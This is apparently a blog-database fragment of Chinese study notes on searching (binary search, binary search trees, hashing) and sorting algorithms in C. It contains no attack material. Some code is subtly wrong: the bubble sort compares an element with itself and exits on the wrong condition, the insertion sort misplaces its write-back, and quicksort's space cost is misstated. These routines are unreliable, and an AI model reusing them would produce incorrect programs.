class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125;SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">SearchBin</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> low,mid,high;<br>    low=<span class=\"hljs-number\">0</span>;<br>    high=ST.length<span class=\"hljs-number\">-1</span>;<br>    keyType target;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;target);<br>    <span class=\"hljs-keyword\">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;low:%d,mid:%d,high:%d\\n&quot;</span>,low,mid,high);<br>        <span class=\"hljs-keyword\">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class=\"hljs-keyword\">return</span> mid;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            low=mid+<span class=\"hljs-number\">1</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>        SeqTable T;<br>        <span class=\"hljs-type\">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">13</span>,<span class=\"hljs-number\">15</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">65</span>,<span class=\"hljs-number\">66</span>,<span class=\"hljs-number\">90</span>,<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class=\"hljs-number\">9</span>;<br>        index=SearchBin(T);<br>        <span class=\"hljs-keyword\">if</span>(index==<span class=\"hljs-number\">-1</span>)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> MAXSIZE 100</span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>&#125;SElemType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span></span><br><span class=\"hljs-class\">&#123;</span><br>    SElemType *elem;<br>    <span class=\"hljs-type\">int</span> length;<br>&#125;SeqTable;<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">SearchBin</span><span class=\"hljs-params\">(SeqTable ST)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> low,mid,high;<br>    low=<span class=\"hljs-number\">0</span>;<br>    high=ST.length<span class=\"hljs-number\">-1</span>;<br>    keyType target;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the target:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;target);<br>    <span class=\"hljs-keyword\">while</span>(low&lt;=high)<br>    &#123;<br>        mid=(low+high)/<span class=\"hljs-number\">2</span>;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;low:%d,mid:%d,high:%d\\n&quot;</span>,low,mid,high);<br>        <span class=\"hljs-keyword\">if</span>(target==ST.elem[mid].key)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find in position %d.&quot;</span>,mid);<br>            <span class=\"hljs-keyword\">return</span> mid;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(target&lt;ST.elem[mid].key)<br>        &#123;<br>            high=mid<span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span><br>        &#123;<br>            low=mid+<span class=\"hljs-number\">1</span>;<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br>        SeqTable T;<br>        <span class=\"hljs-type\">int</span> index;<br>        SElemType DATA[MAXSIZE]=&#123;<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">13</span>,<span class=\"hljs-number\">15</span>,<span class=\"hljs-number\">20</span>,<span class=\"hljs-number\">65</span>,<span class=\"hljs-number\">66</span>,<span class=\"hljs-number\">90</span>,<span class=\"hljs-number\">100</span>,<span class=\"hljs-number\">120</span>&#125;;<br>        T.elem=DATA;<br>        T.length=<span class=\"hljs-number\">9</span>;<br>        index=SearchBin(T);<br>        <span class=\"hljs-keyword\">if</span>(index==<span class=\"hljs-number\">-1</span>)<br>        &#123;<br>            <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>        &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"三、二叉排序树查找（动态）\"><a href=\"#三、二叉排序树查找（动态）\" class=\"headerlink\" title=\"三、二叉排序树查找（动态）\"></a>三、二叉排序树查找（动态）</h2><p>二叉树中所有的左孩子小于其父节点，右孩子大于其父节点</p>\n<p>若根节点的左右子树高度差不超过1，则称为平衡二叉树；ASL=log2（n）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-type\">int</span> keyType;<br><br><span class=\"hljs-keyword\">typedef</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BTNode</span></span><br><span class=\"hljs-class\">&#123;</span><br>    keyType key;<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">struct</span> <span class=\"hljs-title\">BTNode</span> *<span class=\"hljs-title\">lchild</span>,*<span class=\"hljs-title\">rchild</span>;</span><br>&#125;BTNode,*BiTree;<br><br>BiTree <span class=\"hljs-title function_\">SearchBSTree</span><span class=\"hljs-params\">(BTNode *T,keyType key)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(!T||key==T-&gt;key) <span class=\"hljs-keyword\">return</span> T;<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(key&lt;T-&gt;key) <span class=\"hljs-keyword\">return</span>(SearchBSTree(T-&gt;lchild,key));<br>    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">return</span>(SearchBSTree(T-&gt;rchild,key));<br>&#125;<br><br>BTNode *<span class=\"hljs-title function_\">SearchBST</span><span class=\"hljs-params\">(BTNode *T,keyType key,<span class=\"hljs-type\">int</span> *flag)</span><br>&#123;<br>    BTNode *p,*pre;<br>    <span class=\"hljs-comment\">//flag==1，查找成功，返回该元素节点；否则查找失败，返回访问的最后一个节点；</span><br>    *flag=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-keyword\">if</span>(!T)<br>    &#123;<br>        *flag=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">return</span> T;<br>    &#125;<br>    p=T;<br>    pre=T;<br>    <span class=\"hljs-keyword\">while</span>(p!=<span class=\"hljs-literal\">NULL</span>&amp;&amp;key!=p-&gt;key)<br>    &#123;<br>        pre=p;<br>        <span class=\"hljs-keyword\">if</span>(key&lt;p-&gt;key) p=p-&gt;lchild;<br>        <span class=\"hljs-keyword\">else</span> p=p-&gt;rchild;<br>    &#125;<br>    <span class=\"hljs-keyword\">if</span>(p!=<span class=\"hljs-literal\">NULL</span>&amp;&amp;key==p-&gt;key)<br>    &#123;<br>        *flag=<span class=\"hljs-number\">1</span>;<br>        <span class=\"hljs-keyword\">return</span> p;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        *flag=<span class=\"hljs-number\">0</span>;<br>        <span class=\"hljs-keyword\">return</span> pre;<br>    &#125;<br>&#125;<br><br>BTNode *<span class=\"hljs-title function_\">InsertBSTNode</span><span class=\"hljs-params\">(BTNode *T,keyType key)</span><br>&#123;<br>    BTNode *p,*s;<br>    <span class=\"hljs-type\">int</span> flag=<span class=\"hljs-number\">0</span>;<br>    <span class=\"hljs-comment\">//查找是否存在相同节点</span><br>    p=SearchBST(T,key,&amp;flag);<br>    <span class=\"hljs-keyword\">if</span>(!flag)<br>    &#123;<br>        s=(BTNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BTNode));<br>        s-&gt;key=key;<br>        s-&gt;lchild=s-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>        <span class=\"hljs-keyword\">if</span>(!p)<br>        &#123;<br>            <span class=\"hljs-keyword\">return</span> s;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(key&lt;p-&gt;key) p-&gt;lchild=s;<br>        <span class=\"hljs-keyword\">else</span> p-&gt;rchild=s;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br>BiTree <span class=\"hljs-title function_\">Create</span><span class=\"hljs-params\">(keyType key)</span><br>&#123;<br><br>    BiTree T;<br>    T=(BTNode*)<span class=\"hljs-built_in\">malloc</span>(<span class=\"hljs-keyword\">sizeof</span>(BTNode));<br>    <span class=\"hljs-keyword\">if</span>(T==<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Asaign the memory failurely.&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">NULL</span>;<br>    &#125;<br>    T-&gt;key=key;<br>    T-&gt;lchild=T-&gt;rchild=<span class=\"hljs-literal\">NULL</span>;<br>    <span class=\"hljs-keyword\">return</span> T;<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">VisitNode</span><span class=\"hljs-params\">(keyType key)</span><br>&#123;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;%d &quot;</span>,key);<br>&#125;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">InorderTree</span><span class=\"hljs-params\">(BiTree T)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(T!=<span class=\"hljs-literal\">NULL</span>)<br>    &#123;<br>        InorderTree(T-&gt;lchild);<br>        VisitNode(T-&gt;key);<br>        InorderTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>&#123;<br><br>    BTNode *ST;<br>    keyType mykey;<br>    <span class=\"hljs-type\">int</span> index,nums;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Enter the nodes&#x27; number:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;nums);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the root&#x27;s data:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;mykey);<br>    ST=Create(mykey);<br><br>    <span class=\"hljs-keyword\">for</span>(index=<span class=\"hljs-number\">1</span>;index&lt;nums;index++)<br>    &#123;<br>        keyType tmp_key;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the %d node:&quot;</span>,index);<br>        <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;tmp_key);<br>        ST=InsertBSTNode(ST,tmp_key);<br>    &#125;<br>    InorderTree(ST);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Please enter the target data:&quot;</span>);<br>    <span class=\"hljs-built_in\">scanf</span>(<span class=\"hljs-string\">&quot;%d&quot;</span>,&amp;mykey);<br>    ST=SearchBSTree(ST,mykey);<br>    <span class=\"hljs-keyword\">if</span>(!ST)<br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span><br>    &#123;<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Find it:%d!&quot;</span>,mykey);<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"四、哈希表\"><a href=\"#四、哈希表\" class=\"headerlink\" title=\"四、哈希表\"></a>四、哈希表</h2><h3 id=\"1-适用于动态查找和静态查找\"><a href=\"#1-适用于动态查找和静态查找\" class=\"headerlink\" title=\"1.适用于动态查找和静态查找\"></a>1.适用于动态查找和静态查找</h3><h3 id=\"2-常见哈希函数\"><a href=\"#2-常见哈希函数\" class=\"headerlink\" title=\"2.常见哈希函数\"></a>2.常见哈希函数</h3><p>（1）直接定址：适合连续的分布；</p>\n<p>（2）除留取余：假定哈希表长m,取p&lt;=m，一般选择不大于m的最大质数；</p>\n<h3 id=\"3-处理冲突的方法\"><a href=\"#3-处理冲突的方法\" class=\"headerlink\" title=\"3.处理冲突的方法\"></a>3.处理冲突的方法</h3><p>（1）开放地址：Hi=(H(Key)+di)%m;</p>\n<p>​        i.线性探测法：若计算出的地址冲突，则一次向后顺延；容易造成聚集（堆积），降低查找效率；</p>\n<p>​        ii.平方探测法：若计算出的地址冲突，则一次向后/前顺延i^2个地址；</p>\n<p>（2）链地址：在冲突的数据位置设置链表；</p>\n"},{"title":"排序","date":"2021-08-31T12:57:45.000Z","mp3":null,"cover":"img/bg20.jpg","_content":"\n\n# 排序算法\n\n## 一、插入排序\n\n每次将一个待排序的记录插入到前面已经排序的序列；\n\n```c\nvoid InsertSort(RecordType R[],int num)\n{\n    int index1,index2;\n\n    for(index1=2;index1<=num;index1++)\n    {\n       R[0]=R[index1];\n       index2=index1-1;\n       while(R[0].key<R[index2].key)\n       {\n           R[index2+1]=R[index2];\n           index2--;\n           R[index2+1]=R[0];\n       }\n    }\n}\n```\n\n适用于一个基本有序的序列，n^2,稳定的；\n\n## 二、希尔排序\n\n又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；\n\n```c\nvoid ShellSort(RecordType R[],int num)\n{\n    int index1,index2;\n    int increasement;    //增量\n\n    for(increasement=num/2;increasement>0;increasement=increasement/2)\n    {\n        for(index1=increasement+1;index1<=num;index1++)\n        {\n            R[0]=R[index1];\n            index2=index1-increasement;\n            while(index2>=0&&R[0].key<R[index2].key)\n            {\n                R[index2+increasement]=R[index2];\n                index2=index2-increasement;\n            }\n            R[index2+increasement]=R[0];\n        }\n    }\n    return;\n}\n```\n\n空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；\n\n## 三、冒泡排序\n\n每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；\n\n```c\nvoid BubbleSort(RecordType r[],int num)\n{\n    int index1,index2;\n    int isExchange;\n    for(index1=1;index1<num;index1++)\n    {\n        isExchange=0;\n        for(index2=1;index2<=num-1;index2++)\n        {\n            if(r[index2].key>r[index2].key)\n            {\n                r[0]=r[index2+1];\n                r[index2+1]=r[index2];\n                r[index2]=r[0];\n                isExchange=1;\n            }\n        }\n        if(isExchange)\n        {\n            break;\n        }\n    }\n}\n```\n\n时间复杂度O（n^2）,空间复杂度O（1），稳定的；\n\n## 四、快速排序\n\n\n\n```c\nint Partition(RecordType R[],int low,int high)\n{\n    R[0]=R[low];\n    while(low<high)\n    {\n        while(low<high&&R[high].key>=R[0].key)\n        {\n            --high;\n        }\n        R[low]=R[high];\n        while(low<high&&R[low].key<=R[0].key)\n        {\n            ++low;\n        }\n        R[high]=R[low];\n    }\n    R[low]=R[0];\n    return low;\n}\n\nvoid Quicksort(RecordType R[],int low,int high)\n{\n    int loc;\n    if(low<high)\n    {\n        loc=Partition(R,low,high); \n        Quicksort(R,low,loc-1);\n        Quicksort(R,loc+1,high);\n    }\n}\n```\n\n空间复杂度O(1),时间复杂度O（n^2）\n\n## 五、折半插入排序\n\n使用直接插入排序，使用折半查找需要插入的位置；\n\n```c\nvoid BinarySort(RecordType R[],int num)\n{\n    int index1,index2;\n    int lowPoint,highPoint,midPoint;\n    for(index1=1;index1<=num;index1++)\n    {\n        R[0]=R[index1];\n        lowPoint=1;\n        highPoint=index1-1;\n        while(lowPoint<=highPoint)\n        {\n            midPoint=(lowPoint+highPoint)/2;\n            if(R[0].key<R[midPoint].key)\n            {\n                highPoint=midPoint-1;\n            }\n            else\n            {\n                lowPoint=midPoint+1;\n            }\n        }\n        for(index2=index1-1;index2>=highPoint+1;--index2)\n        {\n            R[index2+1]=R[index2];\n        }\n        R[highPoint+1]=R[0];\n    }\n}\n```\n\n","source":"_posts/Ch8排序.md","raw":"---\ntitle: 排序\ndate: 2021-08-31 20:57:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg20.jpg\n---\n\n\n# 排序算法\n\n## 一、插入排序\n\n每次将一个待排序的记录插入到前面已经排序的序列；\n\n```c\nvoid InsertSort(RecordType R[],int num)\n{\n    int index1,index2;\n\n    for(index1=2;index1<=num;index1++)\n    {\n       R[0]=R[index1];\n       index2=index1-1;\n       while(R[0].key<R[index2].key)\n       {\n           R[index2+1]=R[index2];\n           index2--;\n           R[index2+1]=R[0];\n       }\n    }\n}\n```\n\n适用于一个基本有序的序列，n^2,稳定的；\n\n## 二、希尔排序\n\n又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；\n\n```c\nvoid ShellSort(RecordType R[],int num)\n{\n    int index1,index2;\n    int increasement;    //增量\n\n    for(increasement=num/2;increasement>0;increasement=increasement/2)\n    {\n        for(index1=increasement+1;index1<=num;index1++)\n        {\n            R[0]=R[index1];\n            index2=index1-increasement;\n            while(index2>=0&&R[0].key<R[index2].key)\n            {\n                R[index2+increasement]=R[index2];\n                index2=index2-increasement;\n            }\n            R[index2+increasement]=R[0];\n        }\n    }\n    return;\n}\n```\n\n空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；\n\n## 三、冒泡排序\n\n每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；\n\n```c\nvoid BubbleSort(RecordType r[],int num)\n{\n    int index1,index2;\n    int isExchange;\n    for(index1=1;index1<num;index1++)\n    {\n        isExchange=0;\n        for(index2=1;index2<=num-1;index2++)\n        {\n            if(r[index2].key>r[index2].key)\n            {\n                r[0]=r[index2+1];\n                r[index2+1]=r[index2];\n                r[index2]=r[0];\n                isExchange=1;\n            }\n        }\n        if(isExchange)\n        {\n            break;\n        }\n    }\n}\n```\n\n时间复杂度O（n^2）,空间复杂度O（1），稳定的；\n\n## 四、快速排序\n\n\n\n```c\nint Partition(RecordType R[],int low,int high)\n{\n    R[0]=R[low];\n    while(low<high)\n    {\n        while(low<high&&R[high].key>=R[0].key)\n        {\n            --high;\n        }\n        R[low]=R[high];\n        while(low<high&&R[low].key<=R[0].key)\n        {\n            ++low;\n        }\n        R[high]=R[low];\n    }\n    R[low]=R[0];\n    return low;\n}\n\nvoid Quicksort(RecordType R[],int low,int high)\n{\n    int loc;\n    if(low<high)\n    {\n        loc=Partition(R,low,high); \n        Quicksort(R,low,loc-1);\n        Quicksort(R,loc+1,high);\n    }\n}\n```\n\n空间复杂度O(1),时间复杂度O（n^2）\n\n## 五、折半插入排序\n\n使用直接插入排序，使用折半查找需要插入的位置；\n\n```c\nvoid BinarySort(RecordType R[],int num)\n{\n    int index1,index2;\n    int lowPoint,highPoint,midPoint;\n    for(index1=1;index1<=num;index1++)\n    {\n        R[0]=R[index1];\n        lowPoint=1;\n        highPoint=index1-1;\n        while(lowPoint<=highPoint)\n        {\n            midPoint=(lowPoint+highPoint)/2;\n            if(R[0].key<R[midPoint].key)\n            {\n                highPoint=midPoint-1;\n            }\n            else\n            {\n                lowPoint=midPoint+1;\n            }\n        }\n        for(index2=index1-1;index2>=highPoint+1;--index2)\n        {\n            R[index2+1]=R[index2];\n        }\n        R[highPoint+1]=R[0];\n    }\n}\n```\n\n","slug":"Ch8排序","published":1,"updated":"2021-08-31T12:51:24.000Z","_id":"clg29vydh0005ao9c99f369cq","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"排序算法\"><a href=\"#排序算法\" class=\"headerlink\" title=\"排序算法\"></a>排序算法</h1><h2 id=\"一、插入排序\"><a href=\"#一、插入排序\" class=\"headerlink\" title=\"一、插入排序\"></a>一、插入排序</h2><p>每次将一个待排序的记录插入到前面已经排序的序列；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">InsertSort</span><span class=\"hljs-params\">(RecordType R[],<span class=\"hljs-type\">int</span> num)</span><br>&#123;<br>    <span class=\"hljs-type\">int</span> index1,index2;<br><br>    <span class=\"hljs-keyword\">for</span>(index1=<span class=\"hljs-number\">2</span>;index1&lt;=num;index1++)<br>    &#123;<br>       R[<span class=\"hljs-number\">0</span>]=R[index1];<br>       index2=index1<span class=\"hljs-number\">-1</span>;<br>       <span class=\"hljs-keyword\">while</span>(R[<span class=\"hljs-number\">0</span>].key&lt;R[index2].key)<br>       &#123;<br>           R[index2+<span class=\"hljs-number\">1</span>]=R[index2];<br>           index2--;<br>           R[index2+<span class=\"hljs-number\">1</span>]=R[<span class=\"hljs-number\">0</span>];<br>       &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>适用于一个基本有序的序列，n^2,稳定的；</p>\n<h2 id=\"二、希尔排序\"><a href=\"#二、希尔排序\" class=\"headerlink\" 